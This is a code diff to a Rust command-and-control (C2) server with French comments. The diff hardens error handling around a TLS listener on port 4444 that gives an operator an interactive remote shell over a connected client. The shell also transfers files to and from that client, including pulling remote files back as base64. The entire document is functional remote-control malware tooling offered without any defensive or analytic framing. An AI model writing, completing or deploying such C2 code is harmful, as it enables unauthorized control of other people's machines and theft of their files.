@@ -7,17 +7,54 @@ use std::sync::Arc;
 use base64::{Engine as _, engine::general_purpose};
 
 fn main() {
-    println!("Démarrage du Serveur C2 en Rust (Nom de fichier corrigé)...");
+    println!("Démarrage du Serveur C2 en Rust (Mode Robuste & Base64)...");
 
-    let mut file = File::open("identity.pfx").expect("ERREUR: 'identity.pfx' introuvable !");
-    let mut identity_bytes = vec![];
-    file.read_to_end(&mut identity_bytes).unwrap();
+    // ========================================================================
+    // 1. CHARGEMENT DE L'IDENTITÉ (Gestion d'erreurs propre)
+    // ========================================================================
     
-    let identity = Identity::from_pkcs12(&identity_bytes, "password").expect("Mauvais mot de passe PFX !");
-    let acceptor = TlsAcceptor::new(identity).unwrap();
-    let acceptor = Arc::new(acceptor);
+    let mut file = match File::open("identity.pfx") {
+        Ok(f) => f,
+        Err(e) => {
+            eprintln!("[-] ERREUR FATALE: Impossible d'ouvrir 'identity.pfx': {}", e);
+            return;
+        }
+    };
 
-    let listener = TcpListener::bind("0.0.0.0:4444").unwrap();
+    let mut identity_bytes = vec![];
+    if let Err(e) = file.read_to_end(&mut identity_bytes) {
+        eprintln!("[-] ERREUR FATALE: Lecture du fichier PFX échouée: {}", e);
+        return;
+    }
+    
+    let identity = match Identity::from_pkcs12(&identity_bytes, "password") {
+        Ok(id) => id,
+        Err(e) => {
+            eprintln!("[-] ERREUR FATALE: Mauvais mot de passe ou fichier PFX corrompu: {}", e);
+            return;
+        }
+    };
+
+    let acceptor = match TlsAcceptor::new(identity) {
+        Ok(acc) => Arc::new(acc),
+        Err(e) => {
+            eprintln!("[-] ERREUR FATALE: Création TlsAcceptor impossible: {}", e);
+            return;
+        }
+    };
+
+    // ========================================================================
+    // 2. ÉCOUTE RÉSEAU
+    // ========================================================================
+    
+    let listener = match TcpListener::bind("0.0.0.0:4444") {
+        Ok(l) => l,
+        Err(e) => {
+            eprintln!("[-] ERREUR FATALE: Impossible d'écouter sur le port 4444: {}", e);
+            return;
+        }
+    };
+
     println!("[*] En écoute sur le port 4444 (TLS)...");
 
     for stream in listener.incoming() {
@@ -27,6 +64,7 @@ fn main() {
                 
                 thread::spawn(move || {
                     println!("[*] Connexion entrante...");
+                    
                     match acceptor.accept(stream) {
                         Ok(stream) => {
                             println!("[+] Session TLS établie !");
@@ -34,20 +72,22 @@ fn main() {
                             
                             loop {
                                 print!("Shell> ");
-                                io::stdout().flush().unwrap();
+                                let _ = io::stdout().flush();
                                 
                                 let mut command = String::new();
-                                io::stdin().read_line(&mut command).unwrap();
+                                if let Err(e) = io::stdin().read_line(&mut command) {
+                                    println!("[-] Erreur lecture clavier: {}", e);
+                                    break;
+                                }
                                 let command = command.trim().to_string();
 
                                 if command.is_empty() { continue; }
                                 if command == "exit" { break; }
 
-                                // --- ENVOI COMMANDE ---
+                                // --- LOGIQUE ENVOI (UPLOAD) ---
                                 let mut final_command = command.clone();
-                                let mut skip = false;
+                                let mut skip_sending = false;
 
-                                // Si UPLOAD : on encode le fichier local
                                 if command.starts_with("upload") {
                                     let parts: Vec<&str> = command.split_whitespace().collect();
                                     if parts.len() >= 2 {
@@ -60,79 +100,89 @@ fn main() {
                                                 final_command = format!("upload {} {}", b64, remote_name);
                                                 println!("[+] Upload: Envoi de {} octets encodés...", content.len());
                                             },
-                                            Err(e) => { println!("[-] Erreur fichier local: {}", e); skip = true; }
+                                            Err(e) => { 
+                                                println!("[-] Erreur fichier local: {}", e); 
+                                                skip_sending = true; 
+                                            }
                                         }
+                                    } else {
+                                        println!("[-] Usage: upload <local> [distant]");
+                                        skip_sending = true;
                                     }
                                 }
 
-                                if skip { continue; }
+                                if skip_sending { continue; }
 
+                                // Envoi au client
                                 if let Err(e) = reader.get_mut().write_all(format!("{}\n", final_command).as_bytes()) {
-                                    println!("[-] Erreur d'envoi: {}", e); break;
+                                    println!("[-] Erreur d'envoi (Client déconnecté ?): {}", e);
+                                    break;
                                 }
 
-                                // --- RÉCEPTION RÉPONSE (TOUT EST BASE64) ---
+                                // --- RÉCEPTION RÉPONSE ---
                                 let mut buffer = String::new();
                                 match reader.read_line(&mut buffer) {
                                     Ok(n) => {
-                                        if n == 0 { break; }
+                                        if n == 0 { break; } // Fin connexion
                                         let received_b64 = buffer.trim();
 
-                                        // Si c'était un DOWNLOAD, on décode et on écrit sur disque
                                         if command.starts_with("download") {
-                                            // On tente de décoder d'abord
+                                            // Décodage Base64
                                             match general_purpose::STANDARD.decode(received_b64) {
                                                 Ok(bytes) => {
-                                                    // On vérifie si c'est un message d'erreur du client
+                                                    // Vérif erreur client
                                                     let preview = String::from_utf8_lossy(&bytes);
                                                     if preview.starts_with("ERROR:") {
                                                         println!("[-] {}", preview);
                                                     } else {
-                                                        // C'est le fichier !
+                                                        // Extraction nom de fichier propre
                                                         let parts: Vec<&str> = command.split_whitespace().collect();
                                                         if parts.len() >= 2 {
                                                             let raw_path = parts[1];
-                                                            
-                                                            // --- CORRECTION DU NOM DE FICHIER ---
-                                                            // On nettoie le chemin (ex: C:\Win\System32\calc.exe -> calc.exe)
+                                                            // On garde tout ce qui est après le dernier \ ou /
                                                             let filename = raw_path.split(|c| c == '\\' || c == '/').last().unwrap_or("downloaded_file.bin");
 
                                                             match File::create(filename) {
                                                                 Ok(mut file) => {
-                                                                    file.write_all(&bytes).unwrap();
-                                                                    println!("[+] Fichier '{}' reçu ({} octets) !", filename, bytes.len());
-                                                                    // Petit tips pour Linux
-                                                                    println!("[i] Si c'est un binaire Linux : chmod +x {}", filename);
+                                                                    if let Err(e) = file.write_all(&bytes) {
+                                                                        println!("[-] Erreur écriture disque: {}", e);
+                                                                    } else {
+                                                                        println!("[+] Fichier '{}' reçu ({} octets) !", filename, bytes.len());
+                                                                    }
                                                                 },
-                                                                Err(e) => println!("[-] Erreur disque: {}", e),
+                                                                Err(e) => println!("[-] Erreur création fichier: {}", e),
                                                             }
                                                         }
                                                     }
                                                 },
-                                                Err(e) => println!("[-] Erreur B64 Download: {}", e),
+                                                Err(e) => println!("[-] Erreur décodage Base64 Download: {}", e),
                                             }
                                         } else {
-                                            // COMMANDE STANDARD
+                                            // Commande standard (dir, whoami...)
                                             match general_purpose::STANDARD.decode(received_b64) {
                                                 Ok(bytes) => {
                                                     let response = String::from_utf8_lossy(&bytes);
                                                     println!("{}", response);
                                                 },
                                                 Err(_) => {
+                                                    // Fallback si pas Base64
                                                     println!("{}", buffer);
                                                 }
                                             }
                                         }
                                     },
-                                    Err(e) => { println!("[-] Erreur lecture: {}", e); break; }
+                                    Err(e) => {
+                                        println!("[-] Erreur lecture socket: {}", e);
+                                        break;
+                                    }
                                 }
                             }
                         },
-                        Err(e) => println!("[-] Handshake échoué: {}", e),
+                        Err(e) => println!("[-] Handshake TLS échoué: {}", e),
                     }
                 });
             }
-            Err(_) => (),
+            Err(e) => println!("[-] Erreur connexion TCP: {}", e),
         }
     }
 }
